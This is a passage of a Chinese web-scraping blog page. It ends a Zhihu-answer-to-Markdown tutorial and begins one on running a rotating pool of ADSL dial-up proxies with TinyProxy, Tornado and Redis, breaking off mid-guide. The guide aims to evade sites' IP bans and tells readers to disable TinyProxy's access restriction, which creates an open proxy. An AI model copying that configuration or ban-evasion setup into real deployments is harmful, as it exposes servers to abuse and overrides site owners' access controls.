class="string">'id'</span>)</span><br><span class="line">        question_id = content.<span class="builtin-name">get</span>(<span class="string">'question'</span>).<span class="builtin-name">get</span>(<span class="string">'id'</span>)</span><br><span class="line">        question_title = content.<span class="builtin-name">get</span>(<span class="string">'question'</span>).<span class="builtin-name">get</span>(<span class="string">'title'</span>)</span><br><span class="line">        vote_up_count = content.<span class="builtin-name">get</span>(<span class="string">'voteup_count'</span>)</span><br><span class="line">        create_time = time.strftime(<span class="string">"%Y-%m-%d %H:%M:%S"</span>, time.localtime(content.<span class="builtin-name">get</span>(<span class="string">'created_time'</span>)))</span><br><span class="line"></span><br><span class="line">        content = html_template(answer_content)</span><br><span class="line">        soup = BeautifulSoup(content, <span class="string">'lxml'</span>)</span><br><span class="line">        answer = soup.<span class="builtin-name">find</span>(<span class="string">"body"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="builtin-name">print</span> author_name,answer_id,question_id,question_title,vote_up_count,create_time</span><br><span class="line">    # 这里非原创，看了别人的代码，修改了一下</span><br><span class="line">    soup.body.extract()</span><br><span class="line">    soup.head.insert_after(soup.new_tag(<span class="string">"body"</span>, **&#123;<span class="string">'class'</span>: <span class="string">'zhi'</span>&#125;))</span><br><span class="line"></span><br><span class="line">    soup.body.append(answer)</span><br><span class="line"></span><br><span class="line">    img_list = soup.find_all(<span class="string">"img"</span>, <span class="attribute">class_</span>=<span class="string">"content_image lazy"</span>)</span><br><span class="line">    <span class="keyword">for</span> img <span class="keyword">in</span> img_list:</span><br><span class="line">        img[<span class="string">"src"</span>] = img[<span class="string">"data-actualsrc"</span>]</span><br><span class="line">    img_list = soup.find_all(<span class="string">"img"</span>, <span class="attribute">class_</span>=<span class="string">"origin_image zh-lightbox-thumb lazy"</span>)</span><br><span class="line">    <span class="keyword">for</span> img <span class="keyword">in</span> img_list:</span><br><span class="line">        img[<span class="string">"src"</span>] = img[<span class="string">"data-actualsrc"</span>]</span><br><span class="line">    noscript_list = soup.find_all(<span class="string">"noscript"</span>)</span><br><span class="line">    <span class="keyword">for</span> noscript <span class="keyword">in</span> noscript_list:</span><br><span class="line">        noscript.extract()</span><br><span class="line"></span><br><span class="line">    data[<span class="string">'content'</span>] = soup</span><br><span class="line">    data[<span class="string">'author_name'</span>] = author_name</span><br><span class="line">    data[<span class="string">'answer_id'</span>] = answer_id</span><br><span class="line">    data[<span class="string">'question_id'</span>] = question_id</span><br><span class="line">    data[<span class="string">'question_title'</span>] = question_title</span><br><span class="line">    data[<span class="string">'vote_up_count'</span>] = vote_up_count</span><br><span class="line">    data[<span class="string">'create_time'</span>] = create_time</span><br><span class="line"></span><br><span class="line">    return data</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>parse_content.py 主要负责构造新的 html，然后对其进行解析，获取数据。</p>
                  <h2 id="5-测试结果展示"><a href="#5-测试结果展示" class="headerlink" title="5.测试结果展示"></a><strong>5.测试结果展示</strong></h2>
                  <p><a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/06/result.jpg" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/06/result.jpg" alt=""></a> <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/06/result_2.jpg" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/06/result_2.jpg" alt=""></a> 恩，下面还有，就不截图了。</p>
                  <h2 id="6-缺点与不足"><a href="#6-缺点与不足" class="headerlink" title="6.缺点与不足"></a><strong>6.缺点与不足</strong></h2>
                  <p>下面聊一聊这种方法的缺点： 这种方法的最大缺点就是：</p>
                  <h1 id="一定要联网！"><a href="#一定要联网！" class="headerlink" title="一定要联网！"></a>一定要联网！</h1>
                  <h1 id="一定要联网！-1"><a href="#一定要联网！-1" class="headerlink" title="一定要联网！"></a>一定要联网！</h1>
                  <h1 id="一定要联网！-2"><a href="#一定要联网！-2" class="headerlink" title="一定要联网！"></a>一定要联网！</h1>
                  <p>因为。。。。。。 在 md 文件中我们只是写了个图片的网址，这就意味着 markdown 的编辑器帮我们去存放图片的服务器上对这个图片进行了获取，所以断网也就意味着你看不到图片了；同时也意味着如果用户删除了这张图片，你也就看不到了。 但是，后来我又发现在 markdownpad 中将文件导出为 html 时，即使是断网了，依然可以看到全部的内容，包括图片，所以如果你真的喜欢某一个答案，保存到印象笔记肯定是不错的选择，PDF 直接保存也不错，如果是使用了这个方法，记得转为 html 最好。 还有一个缺点就是 html2text 转换过后的效果其实并不是特别好，还是需要后期在进行处理的。</p>
                  <h2 id="7-总结"><a href="#7-总结" class="headerlink" title="7.总结"></a><strong>7.总结</strong></h2>
                  <p>代码还有很多可以改进之处，欢迎大家与我交流：QQ:549411552 （注明来自静觅） 国际惯例：<a href="https://github.com/xiaosimao/transfrom_zhihu_answer_to_md" target="_blank" rel="noopener">代码在这</a> 收工。</p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/四毛" class="author" itemprop="url" rel="index">四毛</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2017-06-05 23:50:07" itemprop="dateCreated datePublished" datetime="2017-06-05T23:50:07+08:00">2017-06-05</time>
                </span>
                <span id="/4607.html" class="post-meta-item leancloud_visitors" data-flag-title="获取知乎问题答案并转换为MarkDown文件" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>9.1k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>8 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/4596.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> Python <i class="label-arrow"></i>
                  </a>
                  <a href="/4596.html" class="post-title-link" itemprop="url">使用Tornado+Redis维护ADSL拨号服务器代理池</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <p>我们尝试维护过一个免费的代理池，但是代理池效果用过就知道了，毕竟里面有大量免费代理，虽然这些代理是可用的，但是既然我们能刷到这个免费代理，别人也能呀，所以就导致这个代理同时被很多人使用来抓取网站，所以当我们兴致勃勃地拿他来抓取某个网站的时候，会发现它还是被网站封禁的状态，所以在某些情况下免费代理池的成功率还是比较低的。 当然我们也可以去购买一些代理，比如几块钱提取几百几千个的代理，然而经过测试后质量也是很一般，也可以去购买专线代理，不过价格也是不菲的。那么目前最稳定而且又保证可用的代理方法就是设置ADSL拨号代理了。 本篇来讲解一下ADSL拨号代理服务器的相关设置。</p>
                  <h2 id="什么是ADSL"><a href="#什么是ADSL" class="headerlink" title="什么是ADSL"></a>什么是ADSL</h2>
                  <p>大家可能对ADSL比较陌生，ADSL全称叫做Asymmetric Digital Subscriber Line，非对称数字用户环路，因为它的上行和下行带宽不对称。它采用频分复用技术把普通的电话线分成了电话、上行和下行三个相对独立的信道，从而避免了相互之间的干扰。 有种主机叫做动态拨号VPS主机，这种主机在连接上网的时候是需要拨号的，只有拨号成功后才可以上网，每拨一次号，主机就会获取一个新的IP，也就是它的IP并不是固定的，而且IP量特别大，几乎不会拨到相同的IP，如果我们用它来搭建代理，既能保证高度可用，又可以自由控制拨号切换。 经测试发现这也是最稳定最有效的代理方式，本节详细介绍一下ADSL拨号代理服务器的搭建方法。</p>
                  <h2 id="购买动态拨号VPS主机"><a href="#购买动态拨号VPS主机" class="headerlink" title="购买动态拨号VPS主机"></a>购买动态拨号VPS主机</h2>
                  <p>所以在开始之前，我们需要先购买一台动态拨号VPS主机，这样的主机在百度搜索一下，服务商还是相当多的，在这里推荐一家<a href="http://www.yunlifang.cn/dynamicvps.asp" target="_blank" rel="noopener">云立方</a>，感觉还是比较良心的，非广告。 配置的话可以自行选择，看下带宽是否可以满足需求就好了。 购买完成之后，就需要安装操作系统了，进入拨号主机的后台，首先预装一个操作系统。 <img src="https://blog-10039692.file.myqcloud.com/1495175818199_5646_1495175827700.jpg" alt=""> 在这里推荐安装CentOS7系统。 然后找到远程管理面板找到远程连接的用户名和密码，也就是SSH远程连接服务器的信息。 比如我这边的IP端口分别是 153.36.65.214:20063，用户名是root。 命令行下输入：</p>
                  <figure class="highlight angelscript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">ssh <span class="symbol">root@</span><span class="number">153.36</span><span class="number">.65</span><span class="number">.214</span> -p <span class="number">20063</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p> 然后输入管理密码，就可以连接上远程服务器了。 进入之后，可以发现有一个可用的脚本文件，叫做ppp.sh，这是拨号初始化的脚本，运行它会让我们输入拨号的用户名和密码，然后它就会开始各种拨号配置，一次配置成功，后面的拨号就不需要重复输入用户名和密码了。 运行ppp.sh脚本，输入用户名密码等待它的配置完成。 <img src="https://blog-10039692.file.myqcloud.com/1495175987975_6876_1495175998841.jpg" alt=""> 都提示成功之后就可以进行拨号了。 在拨号之前如果我们测试ping任何网站都是不通的，因为当前网络还没联通，输入拨号命令：</p>
                  <figure class="highlight crmsh">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">adsl-<span class="literal">start</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>可以发现拨号命令成功运行，没有任何报错信息，这就证明拨号成功完成了，耗时约几秒钟。接下来如果再去ping外网就可以通了。 如果要停止拨号可以输入：</p>
                  <figure class="highlight arduino">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">adsl-<span class="built_in">stop</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>停止之后，可以发现又连不通网络了。</p>
                  <p>所以只有拨号之后才可以建立网络连接。 <img src="https://blog-10039692.file.myqcloud.com/1495176020258_290_1495176022867.jpg" alt=""> 所以断线重播的命令就是二者组合起来，先执行<code>adsl-stop</code>再执行<code>adsl-start</code>，每拨一次号，<code>ifocnfig</code>命令观察一下主机的IP，发现主机的IP一直是在变化的，网卡名称叫做ppp0。 <img src="https://blog-10039692.file.myqcloud.com/1495176189060_6947_1495176191282.jpg" alt=""> 所以，到这里我们就可以知道它作为代理服务器的巨大优势了，如果将这台主机作为代理服务器，如果我们一直拨号换IP，就不怕遇到IP被封的情况了，即使某个IP被封了，重新拨一次号就好了。 所以接下来我们要做的就有两件事，一是怎样将主机设置为代理服务器，二是怎样实时获取拨号主机的IP。</p>
                  <h2 id="设置代理服务器"><a href="#设置代理服务器" class="headerlink" title="设置代理服务器"></a>设置代理服务器</h2>
                  <p>之前我们经常听说代理服务器，也设置过不少代理了，但是可能没有自己设置吧，自己有一台主机怎样设置为代理服务器呢？接下来我们就亲自试验下怎样搭建HTTP代理服务器。 在Linux下搭建HTTP代理服务器，推荐TinyProxy和Squid，配置都非常简单，在这里我们以TinyProxy为例来讲解一下怎样搭建代理服务器。</p>
                  <h3 id="安装TinyProxy"><a href="#安装TinyProxy" class="headerlink" title="安装TinyProxy"></a>安装TinyProxy</h3>
                  <p>当然第一步就是安装TinyProxy这个软件了，在这里我使用的系统是CentOS，所以使用yum来安装，如果是其他系统如Ubuntu可以选择apt-get等命令安装，都是类似的。 命令行执行yum安装指令：</p>
                  <figure class="highlight sql">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">yum <span class="keyword">install</span> -y epel-<span class="keyword">release</span></span><br><span class="line">yum <span class="keyword">update</span> -y</span><br><span class="line">yum <span class="keyword">install</span> -y tinyproxy</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>运行完成之后就可以完成tinyproxy的安装了。</p>
                  <h3 id="配置TinyProxy"><a href="#配置TinyProxy" class="headerlink" title="配置TinyProxy"></a>配置TinyProxy</h3>
                  <p>安装完成之后还需要配置一下TinyProxy才可以用作代理服务器，需要编辑配置文件，它一般的路径是<code>/etc/tinyproxy/tinyproxy.conf</code>。 可以看到有一行</p>
                  <figure class="highlight angelscript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">Port <span class="number">8888</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>在这里可以设置代理的端口，默认是8888。 然后继续向下找，有这么一行</p>
                  <figure class="highlight angelscript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">Allow <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这是被允许连接的主机的IP，如果想任何主机都可以连接，那就直接将它注释即可，所以在这里我们选择直接注释，也就是任何主机都可以使用这台主机作为代理服务器了。 修改为</p>
                  <figure class="highlight angelscript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"># Allow <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>设置完成之后重启TinyProxy即可。</p>
                  <figure class="highlight crmsh">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">service tinyproxy <span class="literal">start</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>验证TinyProxy 好了，这样我们就成功搭建好代理服务器了，首先<code>ifconfig</code>查看下当前主机的IP，比如当前我的主机拨号IP为<code>112.84.118.216</code>，在其他的主机运行测试一下。 比如用curl命令设置代理请求一下httpbin，检测下代理是否生效。</p>
                  <figure class="highlight angelscript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">curl -x <span class="number">112.84</span><span class="number">.118</span><span class="number">.216</span>:<span class="number">8888</span> httpbin.org/<span class="keyword">get</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p><img src="https://blog-10039692.file.myqcloud.com/1495176207822_2326_1495176209195.jpg" alt=""> 如果有正常的结果输出并且origin的值为代理IP的地址，就证明TinyProxy配置成功了。 好，那到现在，我们接下来要做的就是需要动态实时获取主机的IP了。</p>
                  <h2 id="动态获取IP"><a href="#动态获取IP" class="headerlink" title="动态获取IP"></a>动态获取IP</h2>
                  <p>真正的好戏才开始呢，我们怎样动态获取主机的IP呢？可能你首先想到的是DDNS也就是动态域名解析服务，我们需要使用一个域名来解析，也就是虽然IP是变的，但域名解析的地址可以随着IP的变化而变化。 它的原理其实是拨号主机向固定的服务器发出请求，服务器获取客户端的IP，然后再将域名解析到这个IP上就可以了。 国内比较有名的服务就是<a href="http://hsk.oray.com/" target="_blank" rel="noopener">花生壳</a>了，也提供了免费版的动态域名解析，另外DNSPOD也提供了解析接口来动态修改域名解析设置，<a href="https://www.dnspod.cn/docs/records.html#dns" target="_blank" rel="noopener">DNSPOD</a>，但是这样的方式都有一个通病，那就是慢！ 原因在于DNS修改后到完全生效是需要一定时间的，所以如果在前一秒拨号了，这一秒的域名解析的可能还是原来的IP，时间长的话可能需要几分钟，也就是说这段时间内，服务器IP已经变了，但是域名还是上一次拨号的IP，所以代理是不能用的，对于爬虫这种秒级响应的需求，是完全不能接受的。 所以根据花生壳的原理，可以完全自己实现一下动态获取IP的方法。 所以本节重点介绍的就是怎样来实现实时获取拨号主机IP的方法。 要实现这个需要两台主机，一台主机就是这台动态拨号VPS主机，另一台是具有固定公网IP的主机。动态VPS主机拨号成功之后就请求远程的固定主机，远程主机获取动态VPS主机的IP，就可以得到这个代理，将代理保存下来，这样拨号主机每拨号一次，远程主机就会及时得到拨号主机的IP，如果有多台拨号VPS，也统一发送到远程主机，这样我们只需要从远程主机取下代理就好了，保准是实时可用，稳定高效的。 整体思路大体是这样子，当然为了更完善一下，我们要做到如下功能： 远程主机：</p>
                  <ul>
                    <li>监听主机请求，获取动态VPS主机IP</li>
                    <li>将VPS主机IP记录下来存入数据库，支持多个客户端</li>
                    <li>检测当前接收到的IP可用情况，如果不可用则删除</li>
                    <li>提供API接口，通过API接口可获取当前可用代理IP</li>
                  </ul>
                  <p>拨号VPS：</p>
                  <ul>
                    <li>定时执行拨号脚本换IP</li>
                    <li>换IP后立即请求远程主机</li>
                    <li>拨号后检测是否拨号成功，如果失败立即重新拨号</li>
                  </ul>
                  <h3 id="远程主机实现"><a href="#远程主机实现" class="headerlink" title="远程主机实现"></a>远程主机实现</h3>
                  <p>说了这么多，那么我们就梳理一下具体的实现吧，整个项目我们用Python3实现。</p>
                  <h4 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h4>
                  <p>远程主机作为一台服务器，动态拨号VPS会定时请求远程主机，远程主机接收到请求后将IP记录下来存入数据库。 因为IP是一直在变化的，IP更新了之后，原来的IP就不能用了，所以对于一个主机来说我们可能需要多次更新一条数据。另外我们不能仅限于维护一台拨号VPS主机，当然是需要支持多台维护的。在这里我们直接选用Key-Value形式的非关系型数据库存储更加方便，所以在此选用Redis数据库。 既然是Key-Value，Key是什么?Value是什么?首先我们能确定Value就是代理的值，比如112.84.119.67:8888，那么Key是什么？我们知道，这个IP是针对一台动态拨号VPS的，而且这个值会不断地变，所以我们需要有一个不变量Key来唯一标识这台主机，所以在这里我们可以把Key当做主机名称。名称怎么来？自己取就好了，只要每台主机的名字不重复，我们就可以区分出是哪台主机了，这个名字可以在拨号主机那边指定，然后传给远程主机就好了。 所以，在这里数据库我们选用Redis，Key就是拨号主机的名称，可以自己指定，Value就是代理的值。 所以可以写一个操作Redis数据库的类，参考如下：</p>
                  <figure class="highlight ruby">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RedisClient</span>(<span class="title">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(<span class="keyword">self</span>, host=REDIS_HOST, port=REDIS_PORT)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">self</span>.db = redis.Redis(host=host, port=port, password=REDIS_PASSWORD)</span><br><span class="line">        <span class="keyword">self</span>.proxy_key = PROXY_KEY</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">key</span><span class="params">(<span class="keyword">self</span>, name)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&#123;key&#125;:&#123;name&#125;'</span>.format(key=<span class="keyword">self</span>.proxy_key, name=name)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set</span><span class="params">(<span class="keyword">self</span>, name, proxy)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">self</span>.db.set(<span class="keyword">self</span>.key(name), proxy)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(<span class="keyword">self</span>, name)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">self</span>.db.get(<span class="keyword">self</span>.key(name)).decode(<span class="string">'utf-8'</span>)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>首先初始化Redis连接，我们可以将Key设计成<code>adsl:vm1</code>这种形式，冒号前面是总的key，冒号后面是主机名称name，这样显得结构更加清晰。 然后指定set()和get()方法，用来存储代理和获取代理。</p>
                  <h4 id="请求处理"><a href="#请求处理" class="headerlink" title="请求处理"></a>请求处理</h4>
                  <p>拨号主机会一直向远程主机发送请求，远程主机当然可以获取拨号主机的IP，但是代理端口是无法获得的，我们在拨号主机上设置了TinyProxy或者Squid，但是服务器不知道是在哪个端口开的，所以端口也是需要客户端传给远程主机的。远程主机接收到请求后，将解析得到的IP和端口合并就可以作为完整的代理保存了。 所以现在我们知道拨号主机需要传送给远程主机的信息已经有两个了，一是拨号主机本身的名称，二是代理的端口。</p>
                  <h4 id="通信秘钥"><a href="#通信秘钥" class="headerlink" title="通信秘钥"></a>通信秘钥</h4>
                  <p>为了保证远程主机不被恶意的请求干扰，可以设置一个传输秘钥，最简单的方式可以二者共同规定一个秘钥字符串，拨号主机在传送这个字符串，远程主机匹配一下，如果能正确匹配，那就进行下一步的处理，如果不能匹配，那么可能是恶意请求，就忽略这个请求。 当然肯定有更好的加密传输方式，但为了方便起见可以用如上来做。 所以客户机还需要传送一个数据，那就是通信秘钥，一共需要传送三个数据。 所以我们需要架设一个服务器，一直监听客户端的请求，在这里我们用tornado实现。 tornado的安装也非常简单，利用pip安装即可：</p>
                  <figure class="highlight cmake">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">pip3 <span class="keyword">install</span> tornado</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>定义一个处理拨号主机请求的方法，在这里我们使用post请求，参考如下。</p>
                  <figure class="highlight routeros">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">def post(self):</span><br><span class="line">        token = self.get_body_argument(<span class="string">'token'</span>, <span class="attribute">default</span>=None, <span class="attribute">strip</span>=<span class="literal">False</span>)</span><br><span class="line">       <span class="built_in"> port </span>= self.get_body_argument(<span class="string">'port'</span>, <span class="attribute">default</span>=None, <span class="attribute">strip</span>=<span class="literal">False</span>)</span><br><span class="line">        name = self.get_body_argument(<span class="string">'name'</span>, <span class="attribute">default</span>=None, <span class="attribute">strip</span>=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> token == TOKEN <span class="keyword">and</span> port:</span><br><span class="line">           <span class="built_in"> ip </span>= self.request.remote_ip</span><br><span class="line">           <span class="built_in"> proxy </span>=<span class="built_in"> ip </span>+ <span class="string">':'</span> + port</span><br><span class="line">            <span class="builtin-name">print</span>(<span class="string">'Receive proxy'</span>, proxy)</span><br><span class="line">            self.redis.<span class="builtin-name">set</span>(name, proxy)</span><br><span class="line">            self.test_proxies()</span><br><span class="line">        elif token != TOKEN:</span><br><span class="line">            self.write(<span class="string">'Wrong Token'</span>)</span><br><span class="line">        elif <span class="keyword">not</span> port:</span><br><span class="line">            self.write(<span class="string">'No Client Port'</span>)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>远程主机获取请求的token，也就是上面我们所说的通信密钥，保证安全。port是拨号机的代理端口，name是拨号主机的名称。然后我们再获取请求的remote_ip，也就是拨号主机的IP。然后将IP和端口拼合就可以得到拨号主机的完整代理信息了，将其存入数据库即可。</p>
                  <h4 id="代理检测"><a href="#代理检测" class="headerlink" title="代理检测"></a>代理检测</h4>
                  <p>在远程主机端我们需要做一下代理检测，如果某个代理不可用了，会及时将其去除，以免出现获取到代理后不可用的情况。</p>
                  <blockquote>
                    <p>注意：在这里在拨号主机端验证是不够的，因为可能突然遇到某个拨号主机宕机的情况，这样拨号主机就不会再向远程主机发送请求，而最后一次得到的代理还会存在于数据库中，所以在远程主机端统一验证比较科学。</p>
                  </blockquote>
                  <p>验证方式可以定时检测，也可以每收到一次请求检测一次，用获取到的代理来请求某个网站，检测一下是否能访问即可。如果不能，将其从数据库中删除。</p>
                  <h4 id="API"><a href="#API" class="headerlink" title="API"></a>API</h4>
                  <p>远程主机已经将拨号主机的IP和端口保存下来了，那也就是说，所有的可用的代理已经在远程主机保存了，我们需要提供一个接口来将代理获取下来。 比如我们可以提供这么几个方法，获取所有代理，获取最新代理，获取随机代理等等。</p>
                  <figure class="highlight ruby">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">all</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">    keys = <span class="keyword">self</span>.keys()</span><br><span class="line">    proxies = [&#123;<span class="string">'name'</span>: key, <span class="string">'proxy'</span>: <span class="keyword">self</span>.get(key)&#125; <span class="keyword">for</span> key <span class="keyword">in</span> keys]</span><br><span class="line">    <span class="keyword">return</span> proxies</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">    items = <span class="keyword">self</span>.all()</span><br><span class="line">    <span class="keyword">return</span> random.choice(items).get(<span class="string">'proxy'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">    keys = <span class="keyword">self</span>.keys()</span><br><span class="line">    proxies = [<span class="keyword">self</span>.get(key) <span class="keyword">for</span> key <span class="keyword">in</span> keys]</span><br><span class="line">    <span class="keyword">return</span> proxies</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">first</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">self</span>.get(<span class="keyword">self</span>.keys()[<span class="number">0</span>])</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>然后用tornado搭建API服务，如果可以的话还可以绑定一个域名，更加便捷，举例如下： 获取随机代理： <img src="https://blog-10039692.file.myqcloud.com/1495176234257_8333_1495176237128.jpg" alt=""> 获取最新代理： <img src="https://blog-10039692.file.myqcloud.com/1495176256328_2908_1495176259312.jpg" alt=""> 获取所有代理： <img src="https://blog-10039692.file.myqcloud.com/1495176279029_802_1495176279909.jpg" alt=""> 请求接口获取可用代理即可，比如获取一个随机代理：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_random_proxy</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 远程主机的服务地址</span></span><br><span class="line">        url = <span class="string">'http://xxx.xxx.xxx.xxx:8000/random'</span></span><br><span class="line">        <span class="keyword">return</span> requests.get(url).text</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.ConnectionError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这样我们拿到的IP都是稳定可用的，而且过段时间重新请求取到的IP就会变化，是一直动态变化的高可用代理。</p>
                  <h3 id="拨号VPS实现"><a href="#拨号VPS实现" class="headerlink" title="拨号VPS实现"></a>拨号VPS实现</h3>
                  <h4 id="定时拨号"><a href="#定时拨号" class="headerlink" title="定时拨号"></a>定时拨号</h4>
